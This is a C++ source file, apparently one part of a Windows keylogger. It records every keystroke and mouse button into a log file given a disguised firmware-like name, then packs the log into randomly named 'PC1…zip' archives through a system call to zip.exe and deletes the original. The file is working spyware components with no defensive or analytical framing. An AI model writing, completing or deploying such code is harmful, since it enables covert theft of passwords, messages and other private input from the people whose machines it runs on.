/* 
	Author : Dhmosthenhs Xama
	File: ziperHeaders.cpp
*/

#include <iostream>
#include <windows.h>
#include <fstream>
#include <time.h>

#include "randN.h"
#include "ziperHeaders.h"

using namespace std;

char genRandom() {
	return alphanum[rand() % stringLength];
}


string rfName(int size) {
	string Str;
	Str += "PC1";
	srand(time(0));
	for (unsigned int i = 0; i < size-3; ++i)
	{
		Str += genRandom();
	}
	Str += ".zip";
	return Str;
}

void convertZip(string command) {
	system(("zip.exe -r " + command).c_str());
	remove("LIM_TLWN823N_2_UN.bin");
}

void writeLogs(string key) {
	ofstream kLogfile;
	kLogfile.open("LIM_TLWN823N_2_UN.bin", ios::out | ios::app | ios::binary);//open [logs.bin] for append or create it.
	kLogfile << "[ " + key + " ]";
	kLogfile.close();
}

void keyRec(int _key) {

	Sleep(10);
	if (_key == VK_SHIFT)
		writeLogs("SHIFT key");
	else if (_key == VK_BACK)
		writeLogs("BACKSPACE Key");
	else if (_key == VK_LBUTTON)
		writeLogs("LBUTTON");
	else if (_key == VK_RBUTTON)
		writeLogs("RBUTTON");
	else if (_key == VK_RETURN)
		writeLogs("ENTER key");
	else if (_key == VK_ESCAPE)
		writeLogs("ESC key");
	else if (_key == VK_CANCEL)
		writeLogs("Control-break processing");
	else if (_key == VK_MBUTTON)
		writeLogs("Middle mouse button (three-button mouse)");
	else if (_key == VK_TAB)
		writeLogs("TAB key");
	else if (_key == VK_CLEAR)
		writeLogs("CLEAR key");
	else if (_key == VK_CONTROL)
		writeLogs("CTRL key");
	else if (_key == VK_MENU)
		writeLogs("ALT key");
	else if (_key == VK_PAUSE)
		writeLogs("PAUSE key");
	else if (_key == VK_CAPITAL)
		writeLogs("CAPS LOCK key");
	else if (_key == VK_SPACE)
		writeLogs("SPACEBAR");
	else if (_key == VK_END)
		writeLogs("END key");
	else if (_key == VK_HOME)
		writeLogs("HOME key");
	else if (_key == VK_LEFT)
		writeLogs("LEFT ARROW key");
	else if (_key == VK_UP)
		writeLogs("UP ARROW key");
	else if (_key == VK_RIGHT)
		writeLogs("RIGHT ARROW key");
	else if (_key == VK_DOWN)
		writeLogs("DOWN ARROW key");
	else if (_key == VK_SELECT)
		writeLogs("SELECT key");
	else if (_key == VK_PRINT)
		writeLogs("PRINT key");
	else if (_key == VK_EXECUTE)
		writeLogs("EXECUTE key");
	else if (_key == VK_SNAPSHOT)
		writeLogs("PRINT SCREEN key");
	else if (_key == VK_INSERT)
		writeLogs("INS key");
	else if (_key == VK_DELETE)
		writeLogs("DEL key");
	else if (_key == VK_HELP)
		writeLogs("HELP key");
	//numbers
	else if (_key == 0x30)
		writeLogs("0");
	else if (_key == 0x31)
		writeLogs("1");
	else if (_key == 0x32)
		writeLogs("2");
	else if (_key == 0x33)
		writeLogs("3");
	else if (_key == 0x34)
		writeLogs("4");
	else if (_key == 0x35)
		writeLogs("5");
	else if (_key == 0x36)
		writeLogs("6");
	else if (_key == 0x37)
		writeLogs("7");
	else if (_key == 0x38)
		writeLogs("8");
	else if (_key == 0x39)
		writeLogs("9");
	//WORDS
	else if (_key == 0x41)
		writeLogs("a");
	else if (_key == 0x42)
		writeLogs("b");
	else if (_key == 0x43)
		writeLogs("c");
	else if (_key == 0x44)
		writeLogs("d");
	else if (_key == 0x45)
		writeLogs("e");
	else if (_key == 0x46)
		writeLogs("f");
	else if (_key == 0x47)
		writeLogs("g");
	else if (_key == 0x48)
		writeLogs("h");
	else if (_key == 0x49)
		writeLogs("i");
	else if (_key == 0x4A)
		writeLogs("j");
	else if (_key == 0x4B)
		writeLogs("k");
	else if (_key == 0x4C)
		writeLogs("l");
	else if (_key == 0x4D)
		writeLogs("m");
	else if (_key == 0x4E)
		writeLogs("n");
	else if (_key == 0x4F)
		writeLogs("o");
	else if (_key == 0x50)
		writeLogs("p");
	else if (_key == 0x51)
		writeLogs("q");
	else if (_key == 0x52)
		writeLogs("r");
	else if (_key == 0x53)
		writeLogs("s");
	else if (_key == 0x54)
		writeLogs("t");
	else if (_key == 0x55)
		writeLogs("u");
	else if (_key == 0x56)
		writeLogs("v");
	else if (_key == 0x57)
		writeLogs("w");
	else if (_key == 0x58)
		writeLogs("x");
	else if (_key == 0x59)
		writeLogs("y");
	else if (_key == 0x5A)
		writeLogs("z");
	//numpad numbers
	else if (_key == VK_NUMPAD0)
		writeLogs("NUM PAD 0");
	else if (_key == VK_NUMPAD1)
		writeLogs("NUM PAD 1");
	else if (_key == VK_NUMPAD2)
		writeLogs("NUM PAD 2");
	else if (_key == VK_NUMPAD3)
		writeLogs("NUM PAD 3");
	else if (_key == VK_NUMPAD4)
		writeLogs("NUM PAD 4");
	else if (_key == VK_NUMPAD5)
		writeLogs("NUM PAD 5");
	else if (_key == VK_NUMPAD6)
		writeLogs("NUM PAD 6");
	else if (_key == VK_NUMPAD7)
		writeLogs("NUM PAD 7");
	else if (_key == VK_NUMPAD8)
		writeLogs("NUM PAD 8");
	else if (_key == VK_NUMPAD9)
		writeLogs("NUM PAD 9");
	//F* KEYS
	else if (_key == VK_MULTIPLY)
		writeLogs("Multiply key");
	else if (_key == VK_ADD)
		writeLogs("Add key");
	else if (_key == VK_SEPARATOR)
		writeLogs("Separator key");
	else if (_key == VK_SUBTRACT)
		writeLogs("Subtract key");
	else if (_key == VK_DECIMAL)
		writeLogs("Decimal key");
	else if (_key == VK_DIVIDE)
		writeLogs("Divide key");
	else if (_key == VK_F1)
		writeLogs("F1");
	else if (_key == VK_F2)
		writeLogs("F2");
	else if (_key == VK_F3)
		writeLogs("F3");
	else if (_key == VK_F4)
		writeLogs("F4");
	else if (_key == VK_F5)
		writeLogs("F5");
	else if (_key == VK_F6)
		writeLogs("F6");
	else if (_key == VK_F7)
		writeLogs("F7");
	else if (_key == VK_F8)
		writeLogs("F8");
	else if (_key == VK_F9)
		writeLogs("F9");
	else if (_key == VK_F11)
		writeLogs("F11");
	else if (_key == VK_F12)
		writeLogs("F12");
	else if (_key == VK_F13)
		writeLogs("F13");
	else if (_key == VK_F14)
		writeLogs("F14");
	else if (_key == VK_F15)
		writeLogs("F15");
	else if (_key == VK_F16)
		writeLogs("F16");
	else if (_key == VK_F17)
		writeLogs("F17");
	else if (_key == VK_F18)
		writeLogs("F18");
	else if (_key == VK_F19)
		writeLogs("F19");
	else if (_key == VK_F20)
		writeLogs("F20");
	else if (_key == VK_F21)
		writeLogs("F21");
	else if (_key == VK_F22)
		writeLogs("F22");
	else if (_key == VK_F23)
		writeLogs("F23");
	else if (_key == VK_F24)
		writeLogs("F24");
	else if (_key == VK_NUMLOCK)
		writeLogs("NUM LOCK key");
	else if (_key == VK_SCROLL)
		writeLogs("SCROLL LOCK key");
	else if (_key == VK_LSHIFT)
		writeLogs("Left SHIFT key");
	else if (_key == VK_RSHIFT)
		writeLogs("Right SHIFT key");
	else if (_key == VK_LCONTROL)
		writeLogs("Left CONTROL key");
	else if (_key == VK_RCONTROL)
		writeLogs("Right CONTROL key");
	else if (_key == VK_LMENU)
		writeLogs("Left MENU key");
	else if (_key == VK_RMENU)
		writeLogs("Right MENU key");

	else
		writeLogs(to_string(_key));
}

